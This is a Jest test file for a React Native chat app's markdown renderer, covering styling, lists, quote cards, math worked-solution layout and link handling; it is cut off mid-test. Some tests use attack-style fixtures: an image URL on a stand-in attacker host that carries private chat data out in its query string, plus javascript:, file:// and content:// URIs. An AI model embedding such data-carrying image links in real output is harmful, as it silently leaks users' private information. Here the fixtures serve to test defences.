import { StyleSheet, Text, type StyleProp, type TextStyle } from "react-native";
import { fireEvent, render, within } from "@testing-library/react-native";

import { MarkdownContent } from "@/components/MarkdownContent";
import { makeRenderRules } from "@/components/markdown/markdownRenderRules";
import { runRule } from "@/components/markdown/__tests__/support/runRule";
import {
  makeMdStyles,
  PARAGRAPH_GAP,
} from "@/components/markdown/markdownContentStyles";
import { Space } from "@/lib/space";
import { lightTheme } from "@/lib/theme";
import { Type } from "@/lib/type";
import "@/lib/i18n";

// These check the English copy, so they read the real react-i18next over lib/i18n.
jest.unmock("react-i18next");

jest.mock("@/components/LinkPreviewCard", () => {
  const { Pressable, Text } = jest.requireActual(
    "react-native",
  ) as typeof import("react-native");
  return {
    LinkPreviewCard: ({ url }: { url: string }) => (
      <Pressable
        testID="link-preview-card"
        accessibilityRole="link"
        accessibilityLabel={url}
      >
        <Text>{url}</Text>
      </Pressable>
    ),
  };
});
jest.mock("expo-web-browser", () => ({ openBrowserAsync: jest.fn() }));
jest.mock("expo-file-system/legacy", () => ({
  cacheDirectory: "file:///cache/",
  writeAsStringAsync: jest.fn(),
  EncodingType: { UTF8: "utf8" },
}));
jest.mock("@/components/WebPreviewCodeBlock", () => ({
  WebPreviewCodeBlock: "WebPreviewCodeBlock",
}));
jest.mock("@/components/rich/CircularClockBlock", () => ({
  CircularClockBlock: "CircularClockBlock",
}));
jest.mock("@/components/rich/AnswerBlock", () => ({
  AnswerBlock: "AnswerBlock",
}));
jest.mock("@/components/CodeBlock", () => {
  const { Text: RNText } = jest.requireActual("react-native");
  return {
    CodeBlock: ({ code, lang }: { code: string; lang: string }) => (
      <RNText>{`${lang}:${code}`}</RNText>
    ),
  };
});

describe("markdown render rules", () => {
  it("clamps heading4–6 to body size so hierarchy never inverts", () => {
    const styles = makeMdStyles(lightTheme);
    expect(StyleSheet.flatten(styles.heading3)).toMatchObject({
      fontSize: 17,
      fontWeight: "400",
      fontFamily: "SourceSans3-Bold",
    });
    expect(StyleSheet.flatten(styles.heading4)).toMatchObject({
      fontSize: 16,
      fontWeight: "400",
      fontFamily: "SourceSans3-Bold",
    });
    expect(StyleSheet.flatten(styles.heading5)).toMatchObject({ fontSize: 16 });
    expect(StyleSheet.flatten(styles.heading6)).toMatchObject({ fontSize: 16 });
  });

  it("colors ordered-list markers and gives them a fixed rail", () => {
    const styles = makeMdStyles(lightTheme);
    expect(StyleSheet.flatten(styles.ordered_list_icon)).toMatchObject({
      color: lightTheme.text,
      minWidth: 22,
      textAlign: "right",
    });
  });

  it("zeros library block padding/border on inline code", () => {
    const styles = makeMdStyles(lightTheme);
    const inline = StyleSheet.flatten(styles.code_inline);
    expect(inline).toMatchObject({
      borderWidth: 0,
      padding: 0,
      backgroundColor: lightTheme.codeInlineBg,
      fontSize: 14,
      paddingHorizontal: 0,
    });
    expect(inline.lineHeight).toBeUndefined();
    expect(inline.padding).not.toBe(10);
  });

  it("renders a teaching snippet in monospace on a tinted pill", async () => {
    const { getByText } = await render(
      <MarkdownContent content={'Set `name = "john"` then continue.'} />,
    );
    const snippet = getByText('name = "john"');
    const flat = StyleSheet.flatten(snippet.props.style);
    expect(flat.backgroundColor).toBe(lightTheme.codeInlineBg);
    expect(flat.fontFamily).toBe("SpaceMono");
  });

  it("forwards strong children even when the node text contains math", () => {
    const { rules } = makeRenderRules(lightTheme);
    const child = <Text key="c">keep me</Text>;
    const element = runRule(
      rules,
      "strong",
      { key: "s1", content: "keep me $x$" },
      child,
      [],
      { strong: { fontWeight: "700" } },
    );
    expect(element.props.children).toBe(child);
  });

  it("keeps bold and a newline inside a markdown blockquote", async () => {
    const md = "> To be or not to be.\n> — Shakespeare";
    const { getByText } = await render(<MarkdownContent content={md} />);
    expect(getByText(/To be or not to be/)).toBeOnTheScreen();
    expect(getByText(/Shakespeare/)).toBeOnTheScreen();
  });

  it("promotes a quoted attribution paragraph into the quote card", async () => {
    const md =
      '"Courage is the most important of all the virtues because without courage, you can\'t practice any other virtue consistently." - Maya Angelou';
    const { getByText } = await render(<MarkdownContent content={md} />);
    expect(getByText(/Courage is the most important/)).toBeOnTheScreen();
    expect(getByText("— Maya Angelou")).toBeOnTheScreen();
  });

  it("does not paint a brand-blue left stripe on a quote card", async () => {
    const md =
      "> Courage is the most important of all the virtues, because without courage you can't practice any other virtue consistently. — Maya Angelou";
    const { getByText } = await render(<MarkdownContent content={md} />);
    const author = getByText("— Maya Angelou");
    let node:
      | { parent?: unknown; props?: { style?: StyleProp<TextStyle> } }
      | undefined = author;
    let sawPrimaryAccent = false;
    while (node) {
      const flat = StyleSheet.flatten(node.props?.style);
      if (flat?.borderLeftColor === lightTheme.primary) {
        sawPrimaryAccent = true;
        break;
      }
      node = node.parent as typeof node;
    }
    expect(sawPrimaryAccent).toBe(false);
  });

  it("keeps inline bold inside a blockquote", async () => {
    const { getByText } = await render(
      <MarkdownContent content={"> hello **world**"} />,
    );
    expect(getByText("world")).toBeOnTheScreen();
  });

  it("paints a trailing verification tick green", async () => {
    const { getByText } = await render(
      <MarkdownContent content={"0 + 3 = 3 ✓"} />,
    );
    const tick = getByText("✓");
    expect(StyleSheet.flatten(tick.props.style)).toMatchObject({
      color: lightTheme.success,
    });
  });

  it("keeps a fraction verification tick attached before tall math", async () => {
    const { getByText, queryByText, toJSON } = await render(
      <MarkdownContent content={String.raw`$\frac{3}{4}=\frac{6}{8}$ ✓`} />,
    );
    const tick = getByText("✓");
    expect(StyleSheet.flatten(tick.props.style)).toMatchObject({
      color: lightTheme.success,
    });
    expect(queryByText(/\\frac|\$/)).toBeNull();
    const tree = JSON.stringify(toJSON());
    expect(tree.indexOf('"✓"')).toBeLessThan(tree.indexOf("math-text-scroll"));
  });

  it("keeps bold inline in a table cell instead of stacking", async () => {
    const md = [
      "| Feature | Value |",
      "| --- | --- |",
      "| Speed | plain **bold** more |",
    ].join("\n");
    const { getByText } = await render(<MarkdownContent content={md} />);
    const bold = getByText("bold");
    expect(bold).toBeOnTheScreen();
    const parent = bold.parent as { type?: string } | undefined;
    expect(parent?.type).not.toBe("View");
  });

  it("wraps a heading that contains bold", async () => {
    const { getByText } = await render(
      <MarkdownContent content="## Why **RevenueCat** is right" />,
    );
    expect(getByText("RevenueCat")).toBeOnTheScreen();
  });

  it("turns literal <br> in a table cell into a line break", async () => {
    const md = [
      "| Feature | Ethiopia | Kenya |",
      "| --- | --- | --- |",
      "| Famous For | Lucy fossils**<br>**Coffee | Safari<br>Runners |",
    ].join("\n");
    const { queryByText, getByText } = await render(
      <MarkdownContent content={md} />,
    );
    expect(queryByText(/<br/i)).toBeNull();
    expect(getByText(/Lucy fossils/)).toBeOnTheScreen();
    expect(getByText(/Coffee/)).toBeOnTheScreen();
  });

  it("does not paint a fill that differs from the chat background", async () => {
    const md = [
      "| Feature | Ethiopia | Kenya |",
      "| --- | --- | --- |",
      "| Capital | Addis Ababa | Nairobi |",
    ].join("\n");
    const { getByText } = await render(<MarkdownContent content={md} />);
    const fills = new Set<string>();
    const painted = [lightTheme.surface, lightTheme.surfaceAlt];
    for (const label of ["Feature", "Addis Ababa"]) {
      let node:
        | { parent?: unknown; props?: { style?: StyleProp<TextStyle> } }
        | undefined = getByText(label);
      while (node) {
        const flat = StyleSheet.flatten(node.props?.style);
        if (typeof flat?.backgroundColor === "string") {
          fills.add(flat.backgroundColor);
        }
        node = node.parent as typeof node;
      }
    }
    for (const color of painted) {
      expect(fills.has(color)).toBe(false);
    }
  });

  it("drops a stranded trailing colon after a nested-View math formula", async () => {
    // A line ending in "$...$:" with a sqrt (nested View) used to strand the
    // trailing ":" onto its own line ("random two dots" between the rule and
    // the next line). The colon is a redundant "leads to" marker once the
    // next line follows — it must not render as a lone ":".
    const { queryByText } = await render(
      <MarkdownContent
        content={String.raw`Use the product rule $\sqrt{ab}=\sqrt{a}\sqrt{b}$:`}
      />,
    );
    expect(queryByText(/^:$/)).toBeNull();
  });

  it("keeps the colon on For x = 1/2 check labels (frac is a nested View)", async () => {
    const { getByText } = await render(
      <MarkdownContent
        content={"- For $x = \\frac{1}{2}$:\n\n  $0 + 3 = 3$"}
      />,
    );
    // Preprocess tucks `:` into `$x = \frac{1}{2}:$` so the renderer does not
    // drop it as a stranded "two dots" after the stacked fraction.
    expect(getByText(":")).toBeOnTheScreen();
  });

  it("keeps nested bullets as bullets instead of inventing sequence", async () => {
    const md = `- **Powers**
  - eight squared is 64
  - eight cubed is 512`;
    const { getByText, queryByText } = await render(
      <MarkdownContent content={md} />,
    );
    expect(queryByText("1.")).toBeNull();
    expect(queryByText("2.")).toBeNull();
    expect(getByText(/eight squared is 64/)).toBeOnTheScreen();
    expect(queryByText("3.")).toBeNull();
  });

  it("does not put a disc on a parent topic that already has sub-bullets", async () => {
    const md = `- **Strengths**
  - Personalized
  - Task-focused
- Pricing: Free`;
    const { getByText, getAllByTestId } = await render(
      <MarkdownContent content={md} />,
    );
    expect(getByText("Strengths")).toBeOnTheScreen();
    expect(getByText(/Personalized/)).toBeOnTheScreen();
    expect(getByText(/Pricing/)).toBeOnTheScreen();
    expect(getAllByTestId("md-list-bullet")).toHaveLength(3);
    // The parent keeps the disc's column, so its sub-bullets indent under it.
    expect(getAllByTestId("md-list-bullet-spacer")).toHaveLength(1);
  });

  it("renders a facebook fence as a post draft, not highlighted code", async () => {
    const md =
      "```facebook\nHey everyone,\n\nJust wanted to share a quick update on my healing.\n```";
    const { getByText, queryByText } = await render(
      <MarkdownContent content={md} />,
    );
    expect(queryByText(/^facebook:/)).toBeNull();
    expect(getByText(/Just wanted to share a quick update/)).toBeOnTheScreen();
    expect(getByText("Post draft · Facebook")).toBeOnTheScreen();
  });

  it("does not number a flat top-level bullet list", async () => {
    const md = `- Even number
- Composite number`;
    const { queryByText, getByText } = await render(
      <MarkdownContent content={md} />,
    );
    expect(getByText(/Even number/)).toBeOnTheScreen();
    expect(queryByText("1.")).toBeNull();
    expect(queryByText("2.")).toBeNull();
  });

  it("renders inline markdown images through the memory-disk cache", async () => {
    const tri = "data:image/png;base64,iVBORw0KGgo=";
    const { getByLabelText } = await render(
      <MarkdownContent content={`![A red triangle](${tri})`} />,
    );
    const image = getByLabelText("A red triangle");
    expect(image).toBeOnTheScreen();
    expect(image.props.source).toEqual({ uri: tri });
    expect(image.props.contentFit).toBe("contain");
    expect(image.props.cachePolicy).toBe("memory-disk");
  });

  it("loads another host's image only after a tap, naming the host first", async () => {
    const exfil = "https://evil.test/p.png?d=dentist-tuesday";
    const view = await render(
      <MarkdownContent content={`![status](${exfil})`} />,
    );
    expect(view.queryByRole("image")).toBeNull();
    const card = view.getByTestId("tap-to-load-image");
    expect(within(card).getByText("status")).toBeOnTheScreen();
    await fireEvent.press(card);
    const image = view.getByLabelText("status");
    expect(image.props.source).toEqual({ uri: exfil });
  });

  it.each([
    "http://example.com/tracker.png",
    "file:///private/secret.png",
    "content://private/secret.png",
    "javascript:alert(1)",
  ])("does not load unsafe markdown image URI %s", async (uri) => {
    const { queryByRole } = await render(
      <MarkdownContent content={`![unsafe](${uri})`} />,
    );
    expect(queryByRole("image")).toBeNull();
  });

  it("marks markdown links with the link role", async () => {
    const { getByRole } = await render(
      <MarkdownContent content={"See [the docs](https://example.com/docs)"} />,
    );
    expect(getByRole("link", { name: /the docs/ })).toBeOnTheScreen();
  });

  it("renders a preview card for a standalone markdown link", async () => {
    const { getByTestId } = await render(
      <MarkdownContent content={"https://example.com/docs"} />,
    );
    expect(getByTestId("link-preview-card")).toBeOnTheScreen();
  });

  it("renders a preview card for a standalone labeled markdown link", async () => {
    const { getByTestId } = await render(
      <MarkdownContent content={"[the docs](https://example.com/docs)"} />,
    );
    expect(getByTestId("link-preview-card")).toBeOnTheScreen();
  });

  it("renders a workout section as a heading with one row per line", async () => {
    const content = [
      "**Given**  ",
      "$2 x + 3 = 11$",
      "",
      "**Steps**  ",
      "$2 x = 8$ — subtract 3 from both sides  ",
      String.raw`$x = \frac{8}{2}$ — divide both sides by 2`,
    ].join("\n");
    const { getAllByTestId, getByText, queryByText } = await render(
      <MarkdownContent content={content} />,
    );
    expect(getAllByTestId("workout-section")).toHaveLength(2);
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual(["Given", "Steps"]);
    // A stacked fraction on the last line must not pull the lines into one row.
    expect(getAllByTestId("workout-line")).toHaveLength(3);
    expect(getAllByTestId("workout-note")).toHaveLength(2);
    expect(getByText("subtract 3 from both sides")).toBeOnTheScreen();
    expect(queryByText(/\$|\\frac/)).toBeNull();
  });

  it("rules only Given and Required, stacks the givens and names them, and boxes the answer", async () => {
    const content = [
      "**Given**  ",
      String.raw`$m = 5\ \text{kg}$  `,
      String.raw`$F = 20\ \text{N}$  `,
      String.raw`where $m$ = mass, $F$ = force`,
      "",
      "**Required**  ",
      String.raw`$a$`,
      "",
      "**Formula**  ",
      String.raw`$a = \frac{F}{m}$ — Newton's second law`,
      "",
      "**Answer**  ",
      String.raw`$a = 4\ \text{m/s}^2$`,
    ].join("\n");
    const { getAllByTestId, getByTestId, getByText, queryByTestId } =
      await render(<MarkdownContent content={content} />);
    // The headings stay at the margin. Given and Required sit behind a thin rule; the
    // working has none but starts at the same edge; the Answer's box needs neither.
    const bodies = getAllByTestId("workout-body").map((body) =>
      StyleSheet.flatten(body.props.style),
    );
    expect(bodies).toHaveLength(4);
    expect(bodies[0]).toMatchObject({ borderLeftWidth: 2 });
    expect(bodies[1]).toMatchObject({ borderLeftWidth: 2 });
    expect(bodies[2].borderLeftWidth).toBeUndefined();
    expect(bodies[2].paddingLeft).toBe((bodies[0].paddingLeft as number) + 2);
    expect(bodies[3].borderLeftWidth).toBeUndefined();
    expect(
      StyleSheet.flatten(getByTestId("workout-answer").props.style),
    ).toMatchObject({
      alignItems: "center",
    });
    // Each given is its own line, then the line naming them, in secondary ink.
    expect(queryByTestId("workout-given")).toBeNull();
    const givenLines = within(getAllByTestId("workout-body")[0]).getAllByTestId(
      "workout-line",
    );
    expect(givenLines).toHaveLength(3);
    const naming = getByText(/= force/);
    expect(StyleSheet.flatten(naming.props.style)).toMatchObject({
      color: lightTheme.textSecondary,
    });
    // Each name keeps its symbol and its meaning together: "where m = mass," then "F = force".
    const names = getAllByTestId("workout-naming");
    expect(names).toHaveLength(2);
    expect(StyleSheet.flatten(names[0].props.style)).toMatchObject({
      flexDirection: "row",
    });
    expect(names[1]).toHaveTextContent(/F\s*= force/);
    // A move's note is pushed to the right edge.
    const note = getByTestId("workout-note");
    expect(StyleSheet.flatten(note.props.style)).toMatchObject({
      marginLeft: "auto",
    });
    expect(getByText(/second law/)).toBeOnTheScreen();
    // A written-out answer sits in its own box.
    expect(
      within(getByTestId("workout-answer")).getAllByTestId("workout-line"),
    ).toHaveLength(1);
  });

  it("heads the formulas with the law's own name in a worked reply", async () => {
    const content = [
      "**Given**  ",
      String.raw`$u = 0\,\mathrm{km/h} = 0\,\mathrm{m/s}$  `,
      String.raw`$t = 8\,\mathrm{s}$`,
      "",
      "**Required**  ",
      "$a$",
      "",
      "**Constant acceleration**  ",
      "$v = u + at$  ",
      "Solve for $a$  ",
      String.raw`$a = \frac{v - u}{t}$`,
      "",
      "**Substitution**  ",
      String.raw`$a = \frac{27.7778}{8}$`,
    ].join("\n");
    const { getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual(["Given", "Required", "Constant acceleration", "Substitution"]);
    // Laid out like Formula: one row per state, no rule. Solving for the unknown is a
    // step of its own between the law and its rearrangement, not a note beside it.
    const law = getAllByTestId("workout-body")[2]!;
    const lines = within(law).getAllByTestId("workout-line");
    expect(lines).toHaveLength(3);
    expect(lines[1]).toHaveTextContent(/^Solve for\s*a$/);
    expect(within(law).queryByTestId("workout-note")).toBeNull();
    expect(StyleSheet.flatten(law.props.style).borderLeftWidth).toBeUndefined();
  });

  it("heads the working with Solution, its formula by name", async () => {
    const content = [
      "**Given**  \n$d = 3000\\,\\mathrm{m}$",
      "**Required**  \n$v$",
      "**Solution**",
      "**Average speed formula**  \n$v = \\frac{d}{t}$",
      "**Substitution**  \n$v = \\frac{3000}{900}$",
    ].join("\n\n");
    const { getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual([
      "Given",
      "Required",
      "Solution",
      "Average speed formula",
      "Substitution",
    ]);
    // The formula's name is its heading, never a note beside it.
    expect(getAllByTestId("workout-body")).toHaveLength(4);
    expect(
      within(getAllByTestId("workout-body")[2]!).queryByTestId("workout-note"),
    ).toBeNull();
  });

  it("rules an older reply's Find like Required", async () => {
    const content = ["**Given**  ", "$d = 5$", "", "**Find**  ", "$t$"].join(
      "\n",
    );
    const { getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual(["Given", "Find"]);
    const bodies = getAllByTestId("workout-body").map((body) =>
      StyleSheet.flatten(body.props.style),
    );
    expect(bodies.map((body) => body.borderLeftWidth)).toEqual([2, 2]);
  });

  it("heads the formulas with the law's name in a follow-up that skips Required", async () => {
    const content = [
      "**Given**  ",
      String.raw`$F = 70\,\mathrm{N}$`,
      "",
      "**Torque**  ",
      String.raw`$\tau = Fd\sin(\theta)$`,
      "",
      "**Substitution**  ",
      String.raw`$\tau = 70 \cdot 0.4 \cdot \sin(70^\circ)$`,
    ].join("\n");
    const { getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual(["Given", "Torque", "Substitution"]);
  });

  it("sets the parts of a question apart with a hairline, each with its own answer", async () => {
    const content = [
      "**(a) Final velocity**",
      "",
      "**Answer (a)**",
      "",
      "```answer",
      "verified: true",
      String.raw`10\,\mathrm{m/s}`,
      "```",
      "",
      "---",
      "",
      "**(b) Distance**",
      "",
      "**Answer (b)**",
      "",
      "```answer",
      "verified: true",
      String.raw`25\,\mathrm{m}`,
      "```",
    ].join("\n");
    const { toJSON, getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(getAllByTestId("workout-part")).toHaveLength(2);
    type Node = {
      props?: { style?: StyleProp<TextStyle> };
      children?: unknown[] | null;
    };
    const hairlines = (node: unknown): number => {
      if (!node || typeof node !== "object") return 0;
      const { props, children } = node as Node;
      const own =
        StyleSheet.flatten(props?.style)?.height === StyleSheet.hairlineWidth;
      return (
        (own ? 1 : 0) +
        (children ?? []).reduce<number>(
          (sum, child) => sum + hairlines(child),
          0,
        )
      );
    };
    expect(hairlines(toJSON())).toBe(1);
  });

  it("lays out a model's sections written with plain line breaks", async () => {
    // A model wrote one newline after each heading; its first line ran onto the heading.
    const content = [
      "**Given**",
      String.raw`$u = 0\ \text{m/s}$`,
      "",
      "**Constant acceleration**",
      String.raw`$a = \frac{v - u}{t}$`,
      "",
      "**Substitution**",
      String.raw`$a = \frac{27.78 - 0}{8}$`,
      String.raw`$a = 3.47\ \text{m/s}^2$`,
    ].join("\n");
    const { getAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(
      getAllByTestId("workout-heading").map((node) => node.props.children),
    ).toEqual(["Given", "Constant acceleration", "Substitution"]);
    expect(
      within(getAllByTestId("workout-body")[2]!).getAllByTestId("workout-line"),
    ).toHaveLength(2);
  });

  it("leaves a bold line over maths alone outside a worked reply", async () => {
    const content = ["**Constant acceleration**", "$v = u + at$"].join("\n");
    const { queryAllByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(queryAllByTestId("workout-section")).toHaveLength(0);
  });

  it("puts only the last line of a written-out answer in the box; the lines above are working", async () => {
    const content = [
      "**Answer**  ",
      String.raw`$R = \frac{20^2 \sin 60^\circ}{9.81}$  `,
      String.raw`$R = \frac{346.4}{9.81}$  `,
      String.raw`$R \approx 35.3\ \text{m}$`,
    ].join("\n");
    const { getByTestId } = await render(<MarkdownContent content={content} />);
    const body = getByTestId("workout-body");
    expect(within(body).getAllByTestId("workout-line")).toHaveLength(3);
    const box = getByTestId("workout-answer");
    expect(StyleSheet.flatten(box.props.style)).toMatchObject({
      backgroundColor: lightTheme.bg,
      borderWidth: 1,
      borderColor: lightTheme.border,
    });
    const boxed = within(box).getAllByTestId("workout-line");
    expect(boxed).toHaveLength(1);
    expect(boxed[0]).toHaveTextContent(/R ≈ 35\.3/);
    expect(box).not.toHaveTextContent(/346\.4/);
    expect(within(body).getByLabelText(/346\.4/)).toBeOnTheScreen();
  });

  it("keeps a sentence after the answer below the box", async () => {
    const content = "**Answer**  \n$x = 3$  \nOnly the positive root counts.";
    const { getByTestId } = await render(<MarkdownContent content={content} />);
    const box = getByTestId("workout-answer");
    expect(box).toHaveTextContent(/x = 3/);
    expect(box).not.toHaveTextContent(/positive root/);
  });

  it.each([
    ["**(a) Acceleration**", "a", "Acceleration"],
    ["**Part (b): Speed after 3 s**", "b", "Speed after 3 s"],
    ["**c) Distance in those 3 seconds**", "c", "Distance in those 3 seconds"],
  ])(
    "labels a part of a question in parts: %s",
    async (content, letter, title) => {
      const { getByTestId } = await render(
        <MarkdownContent content={content} />,
      );
      const part = getByTestId("workout-part");
      expect(within(part).getByText(letter)).toBeOnTheScreen();
      expect(
        within(getByTestId("workout-part-title")).getByText(title),
      ).toBeOnTheScreen();
    },
  );

  it.each([
    "**Important**",
    "**(a) Acceleration** is the rate of change of velocity.",
    "**(z) Not a part letter**",
  ])("keeps any other bold line ordinary: %s", async (content) => {
    const { queryByTestId } = await render(
      <MarkdownContent content={content} />,
    );
    expect(queryByTestId("workout-part")).toBeNull();
  });

  it("keeps an older one-line Given label in the ordinary renderer", async () => {
    const { queryByTestId } = await render(
      <MarkdownContent content={"**Given:** $2x + 3 = 11$"} />,
    );
    expect(queryByTestId("workout-section")).toBeNull();
  });

  it("puts a lesson step number in a badge apart from the label", async () => {
    const { getByTestId, getByText } = await render(
      <MarkdownContent content={"**1. Divide both sides by 3**"} />,
    );
    expect(getByTestId("lesson-step")).toBeOnTheScreen();
    expect(getByText("1")).toBeOnTheScreen();
    expect(getByText("Divide both sides by 3")).toBeOnTheScreen();
  });

  it("renders fraction math natively inside a lesson-step label", async () => {
    const { getByTestId, queryByText } = await render(
      <MarkdownContent
        content={String.raw`**1. Add $\frac{5}{6}$ to both sides**`}
      />,
    );
    expect(getByTestId("lesson-step-label")).toBeOnTheScreen();
    expect(getByTestId("math-text-tall")).toBeOnTheScreen();
    expect(queryByText(/\\frac|\$/)).toBeNull();
  });

  it("does not show malformed bold delimiters around math prose", async () => {
    const { getByText, queryByText } = await render(
      <MarkdownContent content={String.raw`**Why not simply $x$: **`} />,
    );
    expect(getByText(/Why not simply/)).toBeOnTheScreen();
    expect(queryByText(/\*\*/)).toBeNull();
  });

  it("indents a lesson formula under the step label", async () => {
    const { getByTestId } = await render(
      <MarkdownContent content={"**2. Simplify**\n$x^2 = 1$"} />,
    );
    expect(getByTestId("lesson-step-formula")).toBeOnTheScreen();
  });

  it("stacks the both-sides line and the result under one numbered step", async () => {
    const { getAllByText, getAllByTestId, getByTestId } = await render(
      <MarkdownContent
        content={[
          "**1. Subtract 4 from both sides**  ",
          "$4 x + 4 - 4 = 0 - 4$  ",
          "$4 x = -4$",
        ].join("\n")}
      />,
    );
    expect(getAllByTestId("lesson-step")).toHaveLength(1);
    expect(getByTestId("lesson-step-formula")).toBeOnTheScreen();
    const fours = getAllByText("4");
    expect(
      fours.some((node) =>
        JSON.stringify(node.props.style).includes("SourceSans3-Bold"),
      ),
    ).toBe(true);
  });

  it("renders inline math natively inside a lesson-step reason", async () => {
    const { getByTestId, queryByText } = await render(
      <MarkdownContent
        content={String.raw`**1. Zero exponent law** — for nonzero $a$, $a^0=1$:
$x^0=1$`}
      />,
    );
    expect(getByTestId("lesson-step-reason")).toBeOnTheScreen();
    expect(queryByText(/\$a|\$x/)).toBeNull();
  });

  it("keeps the badge when a rule note is followed by several equation lines", async () => {
    // The hard breaks split the paragraph into textgroups; the step still reads as one.
    const { getAllByTestId } = await render(
      <MarkdownContent
        content={[
          "**1. Evaluate the power** — Exponent: $a^n$ is $a$ multiplied by itself $n$ times  ",
          "$5^{2} = 5 \\cdot 5$  ",
          "$= 25$  ",
          "$3 x^{2} + 25 = 25$",
          "",
          "**2. Subtract 25 from both sides** — Subtraction property of equality  ",
          "$3 x^{2} + 25 - 25 = 25 - 25$  ",
          "$3 x^{2} = 0$",
        ].join("\n")}
      />,
    );
    expect(getAllByTestId("lesson-step")).toHaveLength(2);
    expect(getAllByTestId("lesson-step-reason")).toHaveLength(2);
    expect(getAllByTestId("lesson-step-formula")).toHaveLength(2);
  });

  it("keeps the badge when the step label ends with maths", async () => {
    // Bold that ends in maths is unwrapped for prose, but not for a numbered step.
    const { getByTestId, queryByText } = await render(
      <MarkdownContent
        content={String.raw`**1. Power rule on $x^{3}$** — Power rule: $\frac{d}{dx} x^n = n x^{n-1}$
$\frac{d}{dx} x^{3} = 3 x^{2}$`}
      />,
    );
    expect(getByTestId("lesson-step")).toBeOnTheScreen();
    expect(getByTestId("lesson-step-reason")).toBeOnTheScreen();
    expect(queryByText(/\$/)).toBeNull();
  });

  it("preserves a link after a numbered bold paragraph", async () => {
    const { getByRole, queryByTestId } = await render(
      <MarkdownContent
        content={"**1. Resource** [docs](https://example.com/docs)"}
      />,
    );
    expect(queryByTestId("lesson-step")).toBeNull();
    expect(getByRole("link", { name: "docs" })).toBeOnTheScreen();
  });

  it.each(["**1. Result** $x^2$", "**1. Command** `pnpm test`"])(
    "leaves non-lesson inline content in the markdown renderer: %s",
    async (content) => {
      const { queryByTestId } = await render(
        <MarkdownContent content={content} />,
      );
      expect(queryByTestId("lesson-step")).toBeNull();
    },
  );

  it("renders a citation whose last line is — Name as a quote card", async () => {
    const { getByTestId, getByText } = await render(
      <MarkdownContent content={"> To be or not to be.\n> — Shakespeare"} />,
    );
    expect(getByTestId("quote-card")).toBeOnTheScreen();
    expect(getByText(/To be or not to be/)).toBeOnTheScreen();
    expect(getByText(/Shakespeare/)).toBeOnTheScreen();
  });

  it("renders a citation whose last line is -- Name as a quote card", async () => {
    const { getByTestId, getByText } = await render(
      <MarkdownContent
        content={"> We are such stuff as dreams are made on.\n> -- Prospero"}
      />,
    );
    expect(getByTestId("quote-card")).toBeOnTheScreen();
    expect(getByText(/dreams are made on/)).toBeOnTheScreen();
    expect(getByText("— Prospero")).toBeOnTheScreen();
  });

  it("keeps a cited quote inside its numbered list item", async () => {
    const { getAllByTestId, getByTestId, getByText, queryByTestId } =
      await render(
        <MarkdownContent
          content={
            "1. First point\n\n   > Stay hungry, stay foolish.\n   > — Steve Jobs\n\n2. Second point"
          }
        />,
      );
    const card = within(getByTestId("quote-card"));
    expect(card.getByText("— Steve Jobs")).toBeOnTheScreen();
    expect(card.getByText(/Stay hungry/)).toBeOnTheScreen();
    expect(getAllByTestId("quote-card")).toHaveLength(1);
    // A stray top-level quote holding only "— Steve Jobs" was the bug.
    expect(queryByTestId("indented-prose")).toBeNull();
    expect(getByText("Second point")).toBeOnTheScreen();
  });

  it("renders a Note inside a list item as a callout in that item", async () => {
    const { getByTestId, getByText, queryByTestId } = await render(
      <MarkdownContent
        content={"1. First point\n   > Note: check the units\n2. Second point"}
      />,
    );
    expect(
      within(getByTestId("callout-note")).getByText(/check the units/),
    ).toBeOnTheScreen();
    expect(queryByTestId("indented-prose")).toBeNull();
    expect(getByText("Second point")).toBeOnTheScreen();
  });

  it.each([
    ["an en dash", "> Stay hungry, stay foolish.\n> – Steve Jobs"],
    ["a hyphen", "> Stay hungry, stay foolish.\n> - Steve Jobs"],
  ])(
    "renders a quote closed by %s and a name as a quote card",
    async (_name, content) => {
      const { getByTestId, queryByTestId } = await render(
        <MarkdownContent content={content} />,
      );
      const card = within(getByTestId("quote-card"));
      expect(card.getByText("— Steve Jobs")).toBeOnTheScreen();
      expect(queryByTestId("md-list-bullet")).toBeNull();
    },
  );

  it.each([
    ["a bulleted list", "> Shopping:\n> - Eggs\n> - Milk"],
    ["an en dash list", "> Options:\n> – Fast\n> – Cheap"],
    ["a dialogue", "> — Are you coming?\n> — Yes."],
  ])(
    "keeps %s inside a quote as prose, not a quote card",
    async (_name, content) => {
      const { getByTestId, queryByTestId } = await render(
        <MarkdownContent content={content} />,
      );
      expect(getByTestId("indented-prose")).toBeOnTheScreen();
      expect(queryByTestId("quote-card")).toBeNull();
    },
  );

  it("renders a hint blockquote as indented prose, not a quote card", async () => {
    const { getByTestId, getByText, queryByTestId, toJSON } = await render(
      <MarkdownContent content={"> Hint: try the reciprocal"} />,
    );
    expect(getByText(/try the reciprocal/)).toBeOnTheScreen();
    expect(getByTestId("indented-prose")).toBeOnTheScreen();
    expect(queryByTestId("quote-card")).toBeNull();
    expect(queryByTestId("callout-note")).toBeNull();
    expect(JSON.stringify(toJSON())).not.toContain("lightbulb");
    expect(JSON.stringify(toJSON())).not.toContain("message-quote");
  });

  it("renders Warning and Note blockquotes as callouts", async () => {
    const { getByTestId, getByText, queryByTestId } = await render(
      <MarkdownContent
        content={"> Warning: hot surface\n\n> Note: check the units"}
      />,
    );
    expect(getByTestId("callout-warning")).toBeOnTheScreen();
    expect(getByTestId("callout-note")).toBeOnTheScreen();
    expect(getByText(/hot surface/)).toBeOnTheScreen();
    expect(getByText(/check the units/)).toBeOnTheScreen();
    expect(queryByTestId("quote-card")).toBeNull();
    expect(queryByTestId("indented-prose")).toBeNull();
  });

  it("does not render Tip as a card and shows no lightbulb", async () => {
    const { getByText, queryByTestId, toJSON } = await render(
      <MarkdownContent content={"> Tip: save your work"} />,
    );
    expect(getByText(/save your work/)).toBeOnTheScreen();
